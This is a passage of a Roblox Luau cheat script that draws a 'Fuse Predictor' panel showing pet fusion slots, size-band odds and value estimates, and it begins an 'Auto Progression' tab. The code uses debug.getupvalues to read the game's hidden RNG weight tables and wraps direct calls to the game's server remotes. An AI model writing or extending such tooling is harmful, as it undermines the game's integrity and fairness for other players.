				TextColor = Color3.fromRGB(255, 255, 255),
				TextStrokeTransparency = 0.7,
			},
			Build = function(canvas)
				setupPredictorCanvas(canvas)
				requestEggRefresh()
			end,
		})

		trackCleanup(function()
			predictorCanvasWidget:Destroy()
		end)

		local predictorHeartbeat = RunService.Heartbeat:Connect(function(deltaTime)
			local isPageVisible = eggPredictorHelper.PageVisible()
			local isWidgetVisible

			if isPageVisible then
				isWidgetVisible = eggPredictorSection == nil or eggPredictorHelper.IsShown(eggPredictorSection:Root())
			else
				isWidgetVisible = isPageVisible
			end

			if isWidgetVisible and not predictorWasVisible then
				predictorNeedsUpdate = true
			end

			predictorWasVisible = isWidgetVisible
			if not isPageVisible then
				return
			end
			predictorTimeSinceUpdate += deltaTime

			if isWidgetVisible and predictorNeedsUpdate or predictorTimeSinceUpdate >= predictorUpdateInterval then
				predictorTimeSinceUpdate = 0

				if isWidgetVisible then
					predictorNeedsUpdate = false
					pcall(updatePredictorCanvas)
				end

				if eggPredictorHelper.RefreshFuse then
					pcall(eggPredictorHelper.RefreshFuse)
				end
			end

			if isWidgetVisible and (predictorViewIndex > 0 or predictorNeedsTextUpdate) then
				if predictorViewIndex > 0 then
					predictorViewIndex -= 1
				end

				pcall(refreshPredictorLayout)
			end

			if eggPredictorHelper.PlaceFuse then
				eggPredictorHelper.PlaceFuse()
			end
		end)

		trackCleanup(function()
			predictorHeartbeat:Disconnect()
		end)
	end

	local paintColor, boldFont, colorTheme, predictorIconSize, predictorHeaderLeft, predictorNameHeight, predictorNameScale, predictorRarityScale, predictorSlotIconSize, predictorPaddingX
	local predictorPaddingY, predictorSlotRarityLeft, predictorTextSmallScale, fuseCanvas

	do
		local weightBandFallback = {
			{ min = 0.85, max = 1.05, weight = 2000 },
			{ min = 1.45, max = 1.55, weight = 250 },
			{ min = 1.9, max = 2.1, weight = 125 },
			{ min = 2.85, max = 3.15, weight = 62.5 },
			{ min = 3.8, max = 4.2, weight = 31.25 },
			{ min = 0.3, max = 0.45, weight = 18 },
			{ min = 0.1, max = 0.2, weight = 5 },
			{ min = 5.8, max = 6.2, weight = 15.625 },
			{ min = 9.5, max = 12.5, weight = 3 },
			{ min = 12, max = 17, weight = 0.05 },
			{ min = 20, max = 35, weight = 0.0001 },
		}

		paintColor = eggPredictorHelper.Paint
		boldFont = eggPredictorHelper.Bold
		colorTheme = eggPredictorHelper.Color
		predictorIconSize = 5
		predictorHeaderLeft = predictorIconSize + 0.8
		predictorNameHeight = 1.2
		predictorNameScale = 1.2
		predictorRarityScale = 0.936
		predictorSlotIconSize = 2.3
		predictorPaddingX = 0.25
		predictorPaddingY = 0.18
		predictorSlotRarityLeft = predictorSlotIconSize + 0.6
		local predictorStatusScale = 0.24
		predictorTextSmallScale = 0.22
		local predictorIconCorner = 0.0909
		fuseCanvas = nil
		local fuseControls = {}
		local fuseSlots = {}
		local fuseTextMeasureCache = {}
		local fuseContent = {}
		local fuseWidthRatio = 0
		local fuseScreenHeight = 0
		local fuseScrollOffset = 0.06
		local fuseLastSelectedIndex = -1
		local fuseLastHoveredIndex = -1
		local fuseLastHighlightIndex = -1
		local fuseNameMaxWidth = 4
		local fuseRarityMaxWidth = 3
		local fuseNeedsRelayout = false
		local fuseContentLines = 0
		local weightBandCache = nil

		local valueColorTiers = {
			{ Min = 0, Color = "#8F98A8" },
			{ Min = 0.3, Color = "#C6CDDA" },
			{ Min = 0.85, Color = "#FFFFFF" },
			{ Min = 1.45, Color = "#7CFF9E" },
			{ Min = 1.9, Color = "#4FE0FF" },
			{ Min = 2.85, Color = "#6FA0FF" },
			{ Min = 3.8, Color = "#C08BFF" },
			{ Min = 5.8, Color = "#FF9A3D" },
			{ Min = 9.5, Color = "#FF5C5C" },
			{ Min = 12, Color = "#FFD34D" },
			{ Min = 20, Color = "#FF4DE8" },
		}

		local function getColorForValue(value)
			local highestTierMin = -math.huge
			local resultColor = "#FFFFFF"

			for _, tier in ipairs(valueColorTiers) do
				if value + 0.001 >= tier.Min and tier.Min > highestTierMin then
					resultColor = tier.Color
					highestTierMin = tier.Min
				end
			end

			return resultColor
		end

		local function getEggWeightKg(eggCategory, eggScale)
			local eggRecords = gameModules.EggRecords
			if type(eggRecords) ~= "table" or type(eggRecords.WeightKgForScale) ~= "function" then
				return nil
			end
			local ok, result = pcall(eggRecords.WeightKgForScale, eggCategory, eggScale)
			if ok and type(result) == "number" and result > 0 then
				return result
			end
			return nil
		end

		local function findBestMutation(mutationsList)
			if type(mutationsList) ~= "table" or #mutationsList == 0 then
				return nil
			end
			local highestMultiplier = -math.huge
			local bestMutation = nil

			for _, mutation in ipairs(mutationsList) do
				local multiplier = eggPredictorHelper.MutationMultiplier({ mutation })

				if multiplier > highestMultiplier then
					highestMultiplier = multiplier
					bestMutation = mutation
				end
			end

			return bestMutation
		end

		local function getWeightBands()
			if weightBandCache then
				return weightBandCache
			end
			local eggRecords = gameModules.EggRecords
			local getupvalues_ = type(debug) == "table" and debug.getupvalues or getupvalues

			if type(eggRecords) == "table" and type(eggRecords.DrawAssetScale) == "function" and type(getupvalues_) == "function" then
				local ok, result = pcall(getupvalues_, eggRecords.DrawAssetScale)

				if ok and type(result) == "table" then
					for _, upvalue in pairs(result) do
						if type(upvalue) == "table" and type(upvalue[1]) == "table" and upvalue[1].min and upvalue[1].weight then
							weightBandCache = upvalue
							break
						end
					end
				end
			end

			weightBandCache = weightBandCache or weightBandFallback
			return weightBandCache
		end

		local function calculateFuseBandWeight(weights, primaryWeight, secondaryWeight)
			local fuseKernel = gameModules.FuseKernel

			if type(fuseKernel) == "table" and type(fuseKernel.BandWeightBias) == "function" then
				local ok, result = pcall(fuseKernel.BandWeightBias, weights, primaryWeight, secondaryWeight)
				if ok and type(result) == "number" then
					return result
				end
			end

			return math.exp(math.log((weights[1] + weights[2] + weights[3]) / 3) / 0.69314718055994529 * math.log((primaryWeight + secondaryWeight) / 2) / 0.69314718055994529 * 0.6)
		end

		local function getFusionSlotData()
			local save = gameModules.Save
			if type(save) ~= "table" or type(save.Get) ~= "function" then
				return nil
			end
			local ok, result = pcall(save.Get)
			if not ok or type(result) ~= "table" then
				return nil
			end
			local fusionSlots = type(result.FusionSlots) == "table" and result.FusionSlots or {}
			local inventory = type(result.Inventory) == "table" and result.Inventory or {}
			local slotItems = {}

			for i = 1, 3 do
				local slotId = fusionSlots[i]
				local inventoryItem = slotId ~= nil and inventory[slotId] or nil

				if type(inventoryItem) == "table" then
					table.insert(slotItems, {
						Category = inventoryItem.Category,
						Scale = tonumber(inventoryItem.Scale) or 1,
						Mutations = type(inventoryItem.Mutations) == "table" and inventoryItem.Mutations or {},
					})
				end
			end

			return {
				Items = slotItems,
				Locked = result.FusionLocked == true,
				Duration = tonumber(result.FusionDuration) or 0,
				Reward = result.FusionEggReward ~= nil and result.FusionEggReward ~= false,
			}
		end

		local function getFuseEggGradient(eggData)
			if string.upper(tostring(eggData.Rarity)) == "SECRET" then
				return eggPredictorHelper.SecretGradient
			end
			return eggData.Gradient
		end

		local function getFuseEggColor(eggData)
			return getFuseEggGradient(eggData) ~= nil and Color3.fromRGB(255, 255, 255) or eggData.Color
		end

		local function getFuseEggGradientRotation(eggData)
			if string.upper(tostring(eggData.Rarity)) == "SECRET" then
				return eggPredictorHelper.SecretRotation
			end
			return nil
		end

		local function initializeFuseCanvasControls(canvasInstance)
			fuseCanvas = canvasInstance
			canvasInstance:SetDock(5, { Gap = predictorTextSmallScale, DividerColor = Color3.fromRGB(170, 174, 184) })
			local dockedFrame = canvasInstance:Dock()

			fuseControls.Icon = canvasInstance:Image({
				Parent = dockedFrame,
				X = 0,
				Y = 0,
				Width = predictorIconSize,
				Height = predictorIconSize,
				Corner = 0.35,
				Background = "#000000",
				BackgroundTransparency = 0.26,
				StrokeThickness = predictorIconCorner,
				StrokeTransparency = 0,
				ZIndex = 8,
			})

			fuseControls.Name = canvasInstance:Text({
				Parent = dockedFrame,
				X = predictorHeaderLeft,
				Y = 0,
				Height = predictorNameHeight,
				Scale = predictorNameScale,
				Wrap = false,
				Gradient = eggPredictorHelper.NameGradient,
				TextStrokeTransparency = 1,
				ZIndex = 9,
			})

			fuseControls.Rarity = canvasInstance:Text({
				Parent = dockedFrame,
				X = predictorHeaderLeft,
				Y = 0,
				Height = predictorNameHeight,
				Scale = predictorRarityScale,
				Wrap = false,
				Font = eggPredictorHelper.RarityFont,
				TextStrokeTransparency = 1,
				StrokeTransparency = 0.08,
				ZIndex = 9,
			})

			fuseControls.Info = canvasInstance:Text({ Parent = dockedFrame, X = predictorHeaderLeft, Y = predictorNameHeight, Height = predictorIconSize - predictorNameHeight, Wrap = false, ZIndex = 9 })

			canvasInstance:OnResize(function(currentCanvas, newWidth, newHeight)
				if newWidth == fuseLastSelectedIndex and newHeight == fuseLastHoveredIndex then
					return
				end
				fuseLastSelectedIndex = newWidth
				fuseLastHoveredIndex = newHeight
				fuseWidthRatio = newWidth / math.max(newHeight, 1)
				fuseScreenHeight = newHeight
				fuseContentLines = 2
				fuseScrollOffset = 0.9 / math.max(canvasInstance:TextSize(), 1)
				fuseControls.Rarity.Set({ StrokeThickness = fuseScrollOffset })

				for _, slotWidget in ipairs(fuseSlots) do
					slotWidget.Rarity.Set({ StrokeThickness = fuseScrollOffset })
				end
			end)
		end

		local function getTextGuiObject(textHandle)
			local uiObject = textHandle and textHandle.Get()
			if not uiObject or fuseScreenHeight <= 0 then
				return nil
			end

			if uiObject.Text ~= tostring(textHandle.Spec.Text or "") then
				return nil
			end
			return uiObject
		end

		local function calculateFuseTextWidth(textHandle)
			local uiObject = getTextGuiObject(textHandle)
			if not uiObject then
				return nil
			end
			local originalSize = uiObject.Size
			local originalWrapped = uiObject.TextWrapped
			uiObject.TextWrapped = false
			uiObject.Size = UDim2.fromOffset(100000, math.max(1, originalSize.Y.Offset))
			local textWidth = uiObject.TextBounds.X
			uiObject.Size = originalSize
			uiObject.TextWrapped = originalWrapped
			if textWidth <= 0 then
				return nil
			end
			return textWidth / fuseScreenHeight
		end

		local function calculateFuseTextHeight(textHandle, widthInUnits)
			local uiObject = getTextGuiObject(textHandle)
			if not uiObject then
				return nil
			end
			local originalSize = uiObject.Size
			uiObject.Size = UDim2.fromOffset(math.max(1, math.floor(widthInUnits * fuseScreenHeight + 0.5)), 100000)
			local textHeight = uiObject.TextBounds.Y
			uiObject.Size = originalSize
			if textHeight <= 0 then
				return nil
			end
			return textHeight / fuseScreenHeight
		end

		local function getOrCreateMeasureText(textKey)
			local textWidget = fuseTextMeasureCache[textKey]

			if not textWidget then
				local newText = fuseCanvas:Text({ Name = "Line", X = 0, Y = 0, Width = 1, Height = 1, Wrap = true, Visible = false })
				fuseTextMeasureCache[textKey] = newText
				textWidget = newText
			end

			return textWidget
		end

		local function getOrCreateFuseSlot(slotIndex)
			local slotWidget = fuseSlots[slotIndex]
			if slotWidget then
				return slotWidget
			end

			local slotData = {
				Frame = fuseCanvas:Frame({
					Name = "Slot",
					Background = "#000000",
					BackgroundTransparency = 0.74,
					Corner = 0.35,
					X = 0,
					Y = 0,
					Width = 1,
					Height = 1,
					Visible = false,
				}),
			}

			slotData.Icon = fuseCanvas:Image({
				Parent = slotData.Frame,
				X = predictorPaddingX,
				Y = 0,
				Width = predictorSlotIconSize,
				Height = predictorSlotIconSize,
				Corner = 0.35,
				Background = "#000000",
				BackgroundTransparency = 0.45,
				StrokeThickness = predictorIconCorner,
				StrokeTransparency = 0,
			})

			slotData.Name = fuseCanvas:Text({
				Parent = slotData.Frame,
				X = predictorPaddingX + predictorSlotRarityLeft,
				Y = 0,
				Width = 1,
				Height = predictorNameHeight,
				Scale = predictorNameScale,
				Wrap = false,
				Gradient = eggPredictorHelper.NameGradient,
				TextStrokeTransparency = 1,
			})

			slotData.Rarity = fuseCanvas:Text({
				Parent = slotData.Frame,
				X = predictorPaddingX + predictorSlotRarityLeft,
				Y = 0,
				Width = 1,
				Height = predictorNameHeight,
				Scale = predictorRarityScale,
				Wrap = false,
				Font = eggPredictorHelper.RarityFont,
				TextStrokeTransparency = 1,
				StrokeTransparency = 0.08,
				StrokeThickness = fuseScrollOffset,
			})

			slotData.Detail = fuseCanvas:Text({
				Parent = slotData.Frame,
				X = predictorPaddingX + predictorSlotRarityLeft,
				Y = predictorNameHeight,
				Width = math.max(1, fuseWidthRatio - predictorSlotRarityLeft - predictorPaddingX * 2),
				Height = 1,
				Wrap = true,
			})

			slotData.Status = fuseCanvas:Text({
				Parent = slotData.Frame,
				X = 0,
				Y = 0,
				Width = 1,
				Height = predictorNameHeight,
				Wrap = false,
				Align = "Right",
				Color = colorTheme.Hint,
			})

			fuseSlots[slotIndex] = slotData
			return slotData
		end

		local function relayoutFuseCanvas()
			if fuseWidthRatio <= 0 then
				return
			end
			fuseNeedsRelayout = false
			local availableWidth = math.max(1, fuseWidthRatio - predictorHeaderLeft)
			local rarityWidth = calculateFuseTextWidth(fuseControls.Rarity)

			if rarityWidth then
				fuseRarityMaxWidth = rarityWidth + 0.1
			else
				fuseNeedsRelayout = true
			end

			local nameWidth = calculateFuseTextWidth(fuseControls.Name)

			if nameWidth then
				fuseNameMaxWidth = math.min(nameWidth + 0.1, math.max(1, availableWidth - fuseRarityMaxWidth - predictorStatusScale))
			else
				fuseNeedsRelayout = true
			end

			fuseControls.Name.Set({ X = predictorHeaderLeft, Y = 0, Width = fuseNameMaxWidth, Height = predictorNameHeight })

			fuseControls.Rarity.Set({
				X = predictorHeaderLeft + fuseNameMaxWidth + predictorStatusScale,
				Y = 0,
				Width = math.max(0.5, math.min(fuseRarityMaxWidth, availableWidth - fuseNameMaxWidth - predictorStatusScale)),
				Height = predictorNameHeight,
			})

			fuseControls.Info.Set({ X = predictorHeaderLeft, Y = predictorNameHeight, Width = availableWidth, Height = math.max(1, predictorIconSize - predictorNameHeight) })
			local slotContentWidth = math.max(1, fuseWidthRatio - predictorSlotRarityLeft - predictorPaddingX * 2)
			local accumulatedY = 0

			for _, contentItem in ipairs(fuseContent) do
				if contentItem.Kind == "text" then
					local textHandle = contentItem.Handle
					local textHeight = calculateFuseTextHeight(textHandle, fuseWidthRatio)

					if textHeight then
						contentItem.Height = textHeight
					else
						fuseNeedsRelayout = true
					end

					local itemHeight = math.max(1, contentItem.Height or 1)
					textHandle.Set({ X = 0, Y = accumulatedY + (contentItem.Gap and 0.5 or 0), Width = fuseWidthRatio, Height = itemHeight })
					accumulatedY += itemHeight + predictorTextSmallScale * 0.5 + (contentItem.Gap and 0.5 or 0)
				else
					local slotWidget = contentItem.Slot
					local detailHeight = calculateFuseTextHeight(slotWidget.Detail, slotContentWidth)

					if detailHeight then
						slotWidget.DetailUnits = detailHeight
					else
						fuseNeedsRelayout = true
					end

					local detailLines = math.clamp(slotWidget.DetailUnits or 1, 1, 4)
					local statusWidth = calculateFuseTextWidth(slotWidget.Status)

					if statusWidth then
						slotWidget.StatusUnits = statusWidth + 0.23
					else
						fuseNeedsRelayout = true
					end

					local statusColumnWidth = math.min(slotContentWidth * 0.42, math.max(2.73, slotWidget.StatusUnits or 2.73))
					local nameRarityWidth = math.max(1, slotContentWidth - statusColumnWidth - predictorStatusScale)
					local rarityFieldWidth = calculateFuseTextWidth(slotWidget.Rarity)

					if rarityFieldWidth then
						slotWidget.RarityUnits = rarityFieldWidth + 0.1
					else
						fuseNeedsRelayout = true
					end

					local rarityAllocatedWidth = math.min(slotWidget.RarityUnits or 3, nameRarityWidth * 0.5)
					local nameFieldWidth = calculateFuseTextWidth(slotWidget.Name)

					if nameFieldWidth then
						slotWidget.NameUnits = nameFieldWidth + 0.1
					else
						fuseNeedsRelayout = true
					end

					local min = math.min
					local max = math.max
					local nameUnitsCalculated = slotWidget.NameUnits or 4
					local max2 = math.max
					local nameRarityRemaining = nameRarityWidth - rarityAllocatedWidth - predictorStatusScale
					local nameAllocatedWidth = min(max(1, nameUnitsCalculated), max2(1, nameRarityRemaining))
					local verticalPadding = predictorPaddingY * 2
					local slotHeight = math.max(detailLines + predictorNameHeight, 2.3) + verticalPadding
					local topMargin = (slotHeight - detailLines - predictorNameHeight) / 2
					slotWidget.Frame.Set({ X = 0, Y = accumulatedY, Width = fuseWidthRatio, Height = slotHeight })
					slotWidget.Icon.Set({ Y = (slotHeight - predictorSlotIconSize) / 2 })
					slotWidget.Name.Set({ X = predictorPaddingX + predictorSlotRarityLeft, Y = topMargin, Width = nameAllocatedWidth })
					slotWidget.Rarity.Set({ X = predictorPaddingX + predictorSlotRarityLeft + nameAllocatedWidth + predictorStatusScale, Y = topMargin, Width = math.max(0.5, rarityAllocatedWidth) })
					slotWidget.Detail.Set({ X = predictorPaddingX + predictorSlotRarityLeft, Y = topMargin + predictorNameHeight, Width = slotContentWidth, Height = detailLines })
					slotWidget.Status.Set({ X = predictorPaddingX + predictorSlotRarityLeft + slotContentWidth - statusColumnWidth, Y = topMargin, Width = math.max(0.5, statusColumnWidth) })
					accumulatedY += slotHeight + predictorTextSmallScale
				end
			end

			local totalContentHeight = math.max(1, accumulatedY)

			if math.abs(totalContentHeight - fuseContentLines) > 0.01 then
				fuseContentLines = totalContentHeight
				fuseCanvas:SetContentLines(totalContentHeight)
			end
		end

		local function updateFuseFocus(focusedEgg, fusionData)
			local hasFocus = focusedEgg ~= nil
			fuseCanvas:SetDock(hasFocus and 5 or 0, { Gap = predictorTextSmallScale })
			fuseControls.Icon.Set({ Visible = hasFocus })
			fuseControls.Name.Set({ Visible = hasFocus })
			fuseControls.Rarity.Set({ Visible = hasFocus })
			fuseControls.Info.Set({ Visible = hasFocus })
			if not hasFocus then
				return
			end
			fuseControls.Icon.Set({ Visible = focusedEgg.Icon ~= nil, Image = focusedEgg.Icon or "", StrokeColor = focusedEgg.Color })
			fuseControls.Name.Set({ Text = eggPredictorHelper.Escape(focusedEgg.Name) })

			fuseControls.Rarity.Set({
				Text = string.upper(tostring(focusedEgg.Rarity)),
				Color = getFuseEggColor(focusedEgg),
				Gradient = getFuseEggGradient(focusedEgg),
				GradientRotation = getFuseEggGradientRotation(focusedEgg),
			})

			local statusText = paintColor(colorTheme.Text, string.format("Fusing %d of 3 pets", #fusionData.Items))

			if fusionData.Reward then
				statusText = boldFont(paintColor(colorTheme.Ready, "Fuse finished, claim your egg"))
			elseif fusionData.Locked then
				local remainingTime = fusionData.Duration > 1e9 and fusionData.Duration - workspace:GetServerTimeNow() or 0
				statusText = boldFont(paintColor(colorTheme.Clock, remainingTime > 0 and "Fusing" .. eggPredictorHelper.Separator() .. eggPredictorHelper.FormatClock(remainingTime) or "Fusing"))
			end

			local infoSetFunc = fuseControls.Info.Set
			local infoTable = {}
			local tableConcat = table.concat
			local infoLines = {}
			local incomeText = boldFont(paintColor(colorTheme.Income, eggPredictorHelper.FormatRate(eggPredictorHelper.Income(focusedEgg, fusionData.Items[1].Scale, fusionData.Items[1].Mutations))))
			local itemsText = paintColor(colorTheme.Text, string.format("%d/3 loaded", #fusionData.Items))
			infoLines[1] = incomeText
			infoLines[2] = itemsText
			infoLines[3] = statusText
			infoTable.Text = tableConcat(infoLines, "\n")
			infoSetFunc(infoTable)
		end

		local function refreshFuse()
			if not fuseCanvas then
				return
			end
			fuseContentLines = 2
			table.clear(fuseContent)
			local textLineIndex = 0

			local function addFuseTextLine(textContent, withGap)
				textLineIndex += 1
				local textWidget = getOrCreateMeasureText(textLineIndex)
				textWidget.Set({ Visible = true, Text = textContent })
				table.insert(fuseContent, { Kind = "text", Handle = textWidget, Gap = withGap })
			end

			local function addFuseSectionHeader(headerText, headerColor)
				local hasContentAbove = #fuseContent > 0
				addFuseTextLine(string.format("<b><font color=\"%s\">%s</font></b>", headerColor, headerText), hasContentAbove)
			end

			local fusionState = getFusionSlotData()
			local slotNodeIndex

			if not fusionState then
				updateFuseFocus(nil, nil)
				addFuseTextLine(boldFont(paintColor(colorTheme.Hint, "Fuse machine data is not available yet")), false)
				slotNodeIndex = 0
			elseif #fusionState.Items == 0 then
				updateFuseFocus(nil, nil)
				addFuseTextLine(boldFont(paintColor(colorTheme.Text, "Machine is empty")), false)
				addFuseTextLine(paintColor(colorTheme.Hint, "Load 3 pets of the same species to see the result odds"), false)
				slotNodeIndex = 0
			else
				local fusionItems = fusionState.Items
				local speciesInfo = eggPredictorHelper.AssetInfo(fusionItems[1].Category)
				updateFuseFocus(speciesInfo, fusionState)
				local textColorHex = colorTheme.Text
				addFuseSectionHeader(string.format("FUSE MACHINE STATUS (%d/3 PETS)", #fusionItems), textColorHex)
				addFuseTextLine(paintColor(colorTheme.Hint, "Species") .. "  " .. boldFont(paintColor(speciesInfo.Hex, "[" .. string.upper(tostring(speciesInfo.Rarity)) .. "]")) .. " " .. boldFont(paintColor(colorTheme.Text, eggPredictorHelper.Escape(speciesInfo.Name))), false)
				slotNodeIndex = 0

				for slotPosition = 1, 3 do
					local slotItem = fusionItems[slotPosition]
					slotNodeIndex += 1
					local slotWidget = getOrCreateFuseSlot(slotNodeIndex)
					slotWidget.Frame.Set({ Visible = true })
					slotWidget.Status.Set({ Text = "SLOT " .. slotPosition })

					if slotItem then
						slotWidget.Icon.Set({ Visible = speciesInfo.Icon ~= nil, Image = speciesInfo.Icon or "", StrokeColor = speciesInfo.Color })
						slotWidget.Name.Set({ Text = eggPredictorHelper.Escape(speciesInfo.Name) })

						slotWidget.Rarity.Set({
							Text = string.upper(tostring(speciesInfo.Rarity)),
							Color = getFuseEggColor(speciesInfo),
							Gradient = getFuseEggGradient(speciesInfo),
							GradientRotation = getFuseEggGradientRotation(speciesInfo),
						})

						local weightKg = getEggWeightKg(slotItem.Category, slotItem.Scale)
						local scaleText = boldFont(paintColor(colorTheme.Scale, string.format("%.2fx", slotItem.Scale)))

						if weightKg then
							scaleText ..= eggPredictorHelper.Separator() .. paintColor(colorTheme.Weight, eggPredictorHelper.FormatWeight(weightKg))
						end

						local detailText = scaleText .. eggPredictorHelper.Separator() .. boldFont(paintColor(colorTheme.Income, eggPredictorHelper.FormatRate(eggPredictorHelper.Income(speciesInfo, slotItem.Scale, slotItem.Mutations))))
						local mutationText = eggPredictorHelper.MutationText(slotItem.Mutations)

						slotWidget.Detail.Set({
							Text = detailText .. eggPredictorHelper.Separator() .. (mutationText ~= "" and mutationText or paintColor(colorTheme.Hint, "Normal")),
						})
					else
						slotWidget.Icon.Set({ Visible = false })
						slotWidget.Name.Set({ Text = paintColor(colorTheme.Hint, "Empty") })
						slotWidget.Rarity.Set({ Text = "", Gradient = nil })
						slotWidget.Detail.Set({ Text = paintColor(colorTheme.Hint, "Add a pet to this slot") })
					end

					table.insert(fuseContent, { Kind = "slot", Slot = slotWidget })
				end

				local combinedScale = 0

				for _, fusionItem in ipairs(fusionItems) do
					combinedScale += fusionItem.Scale
				end

				local averageScale = combinedScale / #fusionItems
				local averageWeightKg = getEggWeightKg(fusionItems[1].Category, averageScale)
				local avgText = paintColor(colorTheme.Hint, "Average Scale") .. "  " .. boldFont(paintColor(colorTheme.Scale, string.format("%.2fx", averageScale)))

				if averageWeightKg then
					avgText ..= eggPredictorHelper.Separator() .. paintColor(colorTheme.Weight, eggPredictorHelper.FormatWeight(averageWeightKg))
				end

				addFuseTextLine(avgText, false)
				local strongestMutation = nil

				for _, fusionItem in ipairs(fusionItems) do
					local itemBestMutation = findBestMutation(fusionItem.Mutations)

					if itemBestMutation then
						if (strongestMutation and eggPredictorHelper.MutationMultiplier({ strongestMutation }) or 0) < eggPredictorHelper.MutationMultiplier({ itemBestMutation }) then
							strongestMutation = itemBestMutation
						end
					end
				end

				local mutationsForPredictor = strongestMutation and { strongestMutation } or {}
				addFuseSectionHeader("PREDICTED SIZE PROBABILITIES", colorTheme.Income)

				if #fusionItems == 3 then
					local itemScales = { fusionItems[1].Scale, fusionItems[2].Scale, fusionItems[3].Scale }
					local scaleProbabilities = {}
					local totalProbabilityWeight = 0

					for _, bandData in ipairs(getWeightBands()) do
						local bandWeight = bandData.weight * calculateFuseBandWeight(itemScales, bandData.min, bandData.max)
						totalProbabilityWeight += bandWeight
						table.insert(scaleProbabilities, { Min = bandData.min, Max = bandData.max, Weight = bandWeight, Color = getColorForValue(bandData.min) })
					end

					table.sort(scaleProbabilities, function(probA, probB)
						return probA.Weight > probB.Weight
					end)

					local mostLikelyProb = scaleProbabilities[1]

					for _, probabilityData in ipairs(scaleProbabilities) do
						local percentChance = totalProbabilityWeight > 0 and probabilityData.Weight / totalProbabilityWeight * 100 or 0
						local rangeText = boldFont(paintColor(probabilityData.Color, string.format("%.2fx - %.2fx", probabilityData.Min, probabilityData.Max)))
						local minWeightKg = getEggWeightKg(fusionItems[1].Category, probabilityData.Min)
						local maxWeightKg = getEggWeightKg(fusionItems[1].Category, probabilityData.Max)

						if minWeightKg and maxWeightKg then
							local weightColor = colorTheme.Weight
							local stringFormat = string.format
							local formatWeightFunc = eggPredictorHelper.FormatWeight
							rangeText ..= eggPredictorHelper.Separator() .. paintColor(weightColor, stringFormat("%s - %s", eggPredictorHelper.FormatWeight(minWeightKg), formatWeightFunc(maxWeightKg)))
						end

						addFuseTextLine(rangeText .. eggPredictorHelper.Separator() .. boldFont(paintColor(percentChance >= 10 and colorTheme.Income or percentChance >= 1 and colorTheme.Clock or colorTheme.Hint, string.format(percentChance >= 1 and "%.1f%%" or "%.3f%%", percentChance))), false)
					end

					addFuseSectionHeader("RESULT PREDICTION", colorTheme.Text)
					addFuseTextLine(paintColor(colorTheme.Hint, "Predicted Mutation") .. "  " .. (strongestMutation and eggPredictorHelper.MutationText(mutationsForPredictor) or paintColor(colorTheme.Text, "Normal")), false)

					if mostLikelyProb then
						addFuseTextLine(paintColor(colorTheme.Hint, "Estimated Value") .. "  " .. boldFont(paintColor(colorTheme.Income, eggPredictorHelper.FormatRate(eggPredictorHelper.Income(speciesInfo, mostLikelyProb.Min, mutationsForPredictor)) .. " ~ " .. eggPredictorHelper.FormatRate(eggPredictorHelper.Income(speciesInfo, mostLikelyProb.Max, mutationsForPredictor)))) .. eggPredictorHelper.Separator() .. paintColor(colorTheme.Hint, "at ") .. boldFont(paintColor(mostLikelyProb.Color, string.format("%.2fx - %.2fx", mostLikelyProb.Min, mostLikelyProb.Max))), false)
					end

					local probIteratorFunc, probTable, probKey = ipairs(scaleProbabilities)
					local bestCaseProb = nil

					for _, probEntry in probIteratorFunc, probTable, probKey do
						if not bestCaseProb or probEntry.Max > bestCaseProb.Max then
							bestCaseProb = probEntry
						end
					end

					if bestCaseProb then
						addFuseTextLine(paintColor(colorTheme.Hint, "Best Case") .. "  " .. boldFont(paintColor(bestCaseProb.Color, string.format("%.2fx - %.2fx", bestCaseProb.Min, bestCaseProb.Max))) .. "  " .. boldFont(paintColor(colorTheme.Income, eggPredictorHelper.FormatRate(eggPredictorHelper.Income(speciesInfo, bestCaseProb.Max, mutationsForPredictor)))), false)
					end
				else
					addFuseTextLine(paintColor(colorTheme.Hint, string.format("Load %d more of the same species to see the odds", 3 - #fusionState.Items)), false)
				end
			end

			for textLineIdx = textLineIndex + 1, #fuseTextMeasureCache do
				fuseTextMeasureCache[textLineIdx].Set({ Visible = false })
			end

			for slotIdx = slotNodeIndex + 1, #fuseSlots do
				fuseSlots[slotIdx].Frame.Set({ Visible = false })
			end

			relayoutFuseCanvas()
			fuseContentLines = 2
		end

		if not eggPredictorHelper.Ready then
			fusePredictorSection:CreateText({
				Name = "Fuse Predictor",
				Text = "Update the Chilli Library to use the predictor canvas.",
			})
		else
			local fuseCanvasHandle = fusePredictorSection:CreateCanvas({
				Name = "Fuse Predictor",
				Layout = "free",
				Style = {
					TextScale = 0.84,
					LineHeight = 1.1,
					MinLines = 16,
					MaxLines = 34,
					BackgroundTransparency = 0.5,
					ScrollBarColor = Color3.fromRGB(170, 174, 184),
					TextColor = Color3.fromRGB(255, 255, 255),
					TextStrokeTransparency = 0.7,
				},
				Build = function(canvasInstance)
					initializeFuseCanvasControls(canvasInstance)

					if type(eggPredictorHelper.RequestEggRefresh) == "function" then
						eggPredictorHelper.RequestEggRefresh()
					end
				end,
			})

			eggPredictorHelper.RefreshFuse = refreshFuse

			eggPredictorHelper.PlaceFuse = function()
				if fuseContentLines > 0 or fuseNeedsRelayout then
					if fuseContentLines > 0 then
						fuseContentLines -= 1
					end

					pcall(relayoutFuseCanvas)
				end
			end

			trackCleanup(function()
				fuseCanvasHandle:Destroy()
			end)
		end
	end

	local progressSection
	-- ══════════════════════════════════════════════════════════════════════════
	-- 📈 [SECTION 4] PROGRESS TAB - AUTO PROGRESSION, TRAILS & BASE UPGRADES
	-- ══════════════════════════════════════════════════════════════════════════
	progressSection = hubWindow:CreateTab({ Name = "Progress", SectionsExpanded = true }):CreateSection({ Name = "Auto Progression", Expanded = true })

	do
		local remoteCache = {}
		local progressApi

		progressApi = {
			Remote = function(remotePath)
				local cachedRemote = remoteCache[remotePath]
				if cachedRemote ~= nil then
					return cachedRemote or nil
				end
				local remoteObject = networking:FindFirstChild(remotePath)
				remoteCache[remotePath] = remoteObject or false
				return remoteObject
			end,
			Invoke = function(remotePath, ...)
				local remoteFunc = progressApi.Remote(remotePath)
				if not remoteFunc or not remoteFunc:IsA("RemoteFunction") then
					return false, nil
				end
				local ok, result = pcall(remoteFunc.InvokeServer, remoteFunc, ...)
				return ok, result
			end,
			Fire = function(remotePath, ...)
				local remoteEvent = progressApi.Remote(remotePath)
				if not remoteEvent or not remoteEvent:IsA("RemoteEvent") then
					return false
				end
				return pcall(remoteEvent.FireServer, remoteEvent, ...)
			end,
		}

		local function getSaveData()
			local save = gameModules.Save
			if type(save) ~= "table" or type(save.Get) ~= "function" then
				return nil
			end
			local ok, result = pcall(save.Get)
			return ok and type(result) == "table" and result or nil
		end

		progressApi.SaveData = getSaveData
